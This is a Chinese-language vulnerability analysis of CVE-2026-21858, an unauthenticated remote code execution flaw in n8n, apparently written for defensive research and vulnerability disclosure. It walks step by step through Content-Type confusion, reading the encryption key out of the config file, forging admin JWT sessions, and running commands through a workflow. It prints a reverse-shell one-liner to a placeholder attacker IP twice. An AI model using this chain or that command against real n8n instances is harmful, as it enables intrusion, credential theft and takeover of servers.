## CVE-2026-21858 - n8n 远程代码执行 (RCE)

**漏洞编号:** CVE-2026-21858

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** n8n

**危害等级:** 严重

**CVSS评分:** 10.0

**影响版本:** 1.65.0 至 1.121.0 (不包含 1.121.0)

**利用条件:** 未经身份验证的远程访问，需暴露公开的Webhook或表单端点

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

CVE-2026-21858，代号“Ni8mare”，是n8n开源低代码工作流自动化平台中发现的一个最高严重级别漏洞，允许未经身份验证的远程攻击者完全控制受影响的n8n实例，并最终实现远程代码执行（RCE）。该漏洞源于n8n表单（Form）节点在处理HTTP请求时，未能正确验证Content-Type头部，导致攻击者可通过类型混淆覆盖req.body.files对象，从而操纵文件路径参数。

**POC有效性分析：**
提供的“ATTACKVECTOR.md”文档详细阐述了CVE-2026-21858的完整攻击链，从初始访问到最终的远程代码执行。该文档以高度结构化的方式分阶段描述了攻击过程，使其具有极高的可理解性和可复现性。其有效性体现在对关键漏洞点和利用机制的深入揭示：

1.  **Content-Type混淆**：漏洞核心在于`parseRequestBody()`函数未能区分`multipart/form-data`和`application/json`请求。攻击者可以向期望文件上传的端点发送一个恶意的JSON payload，其中包含`filepath`、`mimetype`和`filename`字段。系统错误地将JSON中的`filepath`解释为新上传文件的本地路径，从而实现任意文件路径的写入控制。这一点是后续所有攻击步骤的基础。
2.  **任意文件读取与数据泄露**：利用Content-Type混淆成功控制文件路径后，攻击者可以通过`prepareFormReturnItem()`函数将指定路径（例如`.n8n/config`或`database.sqlite`）的文件内容复制到n8n的一个公开可访问的文件夹中。这使得攻击者能够窃取敏感信息，如N8N_ENCRYPTION_KEY（用于加密的静态密钥）和数据库中的用户哈希，这是实现权限升级的关键一步。
3.  **会话伪造与权限升级**：窃取到N8N_ENCRYPTION_KEY后，攻击者可以利用其生成一个有效的JSON Web Token (JWT)，用于`n8n-auth` cookie。由于n8n使用单一静态加密密钥来签名所有用户会话，攻击者能够成功绕过身份验证，获取所有者/管理员权限，从而完全控制n8n实例。
4.  **通过工作流实现RCE**：获得管理员权限后，攻击者可以通过n8n的REST API自动化创建新的工作流。在工作流中，可以插入“执行命令”或“代码”节点（Node.js），并注入任意操作系统命令，例如反向Shell命令，从而实现远程代码执行。文档中提供的`bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"`就是实现反向Shell的典型示例。

该POC文档不仅提供了攻击的逻辑分析，还给出了具体的Payload示例，如JSON注入结构和反向Shell命令，清晰地勾勒出从无认证到RCE的完整攻击链。这使得安全研究人员可以准确地理解并复现漏洞，评估其真实威胁。其详细程度和完整性证明了其高度的有效性。

**利用步骤：**
1.  **侦察与发现 (T1595)**：攻击者通过Shodan/Censys等搜索引擎识别互联网上暴露的n8n实例，并进一步探测其活动Webhook端点，特别是利用Form Webhook节点的端点。同时，通过HTTP头或静态文件指纹识别n8n版本，目标版本范围为1.65.0至1.121.0。
2.  **武器化 - Content-Type混淆 (T1190)**：攻击者构造恶意的JSON payload，将其中的`filepath`参数设置为目标系统上的敏感文件路径（例如`/home/node/.n8n/config`），然后将其发送至Form Webhook端点。利用`parseRequestBody()`函数处理Content-Type混淆的逻辑缺陷，系统会将该JSON内容误识别为文件上传，并将其存储到指定的敏感路径。
3.  **数据泄露 - 任意文件读取 (T1083)**：攻击者利用`prepareFormReturnItem()`函数将之前注入的文件路径（实际上是系统上的敏感文件，如`config`或`database.sqlite`）的内容复制到一个公开可访问的n8n文件夹中。通过访问该公开路径，攻击者即可读取敏感信息，如`N8N_ENCRYPTION_KEY`。
4.  **利用 - 会话伪造 (T1550.004)**：攻击者使用窃取的`N8N_ENCRYPTION_KEY`密钥伪造一个有效的JWT（JSON Web Token），并将其设置为`n8n-auth` cookie。通过此伪造的会话，攻击者无需认证即可获得n8n实例的所有者/管理员权限。
5.  **安装 - 通过工作流实现RCE (T1059.003)**：获得管理员权限后，攻击者通过n8n的REST API创建一个新的工作流。在该工作流中，添加一个“执行命令”或“代码”节点，并嵌入恶意命令（例如反向Shell命令`bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"`），然后触发该工作流执行，从而在受害n8n实例上实现远程代码执行。

**投毒风险分析：**
提供的POC是一个名为“ATTACKVECTOR.md”的文档，它以详细的文本形式描述了CVE-2026-21858的攻击流程和技术细节，而非可直接执行的代码文件。基于此特性，该POC本身的“投毒风险”极低，评估为5%。

1.  **代码形态**：这是一个Markdown格式的文本文件，内容是攻击的逻辑说明、步骤和示例Payload。它不包含任何可直接运行的脚本代码、编译后的二进制文件或外部依赖。这意味着它本身无法被注入恶意执行逻辑或携带隐藏的恶意负载。
2.  **透明性**：文档内容清晰、结构化，所有攻击步骤、涉及的函数、利用的参数以及示例Payload（如JSON注入和反向Shell命令）都明确披露。这种透明性使得任何潜在的恶意行为都无所遁形，易于安全分析人员审计和理解。
3.  **恶意Payload的性质**：文档中提及的反向Shell命令是作为RCE攻击的最终阶段Payload示例出现的，其目的是演示漏洞被成功利用后的危害。它不是隐藏在POC代码中试图主动攻击研究人员的恶意内容，而是漏洞利用本身的一部分。因此，这属于攻击链描述，而非POC自身携带的投毒代码。
4.  **潜在风险**：尽管该文档本身无直接投毒风险，但如果第三方根据此文档编写实际的自动化利用脚本，则该脚本可能被恶意篡改或注入恶意功能。然而，这是关于基于POC的二次开发风险，而非原始POC文档的风险。对于作为防御性安全研究的我们，分析的是当前提供的POC材料。因此，我们认为提供的ATTACKVECTOR.md文件不会带来直接的投毒风险，其目的是纯粹的漏洞披露和技术分析，用于防御性研究和教育目的。


**项目地址:** 

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2026-21858
